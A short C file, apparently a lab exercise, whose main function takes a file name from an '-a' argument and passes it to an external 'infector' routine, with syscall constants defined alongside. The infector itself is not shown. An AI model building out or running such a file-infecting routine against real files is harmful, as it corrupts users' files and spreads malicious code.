#include "util.h"
#include <stdio.h>
#define SYS_WRITE 4
#define STDOUT 1

#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

extern int system_call();
extern void infector(char* fileName);

int main (int argc , char* argv[], char* envp[]){
   
    char* fileName;
   
    if (argc > 1) {
       
        if (strncmp(argv[1], "-a" , 2) == 0){
            fileName = &argv[1][2];
            infector(fileName);
        }
       
             
    }
   
    return 0;
}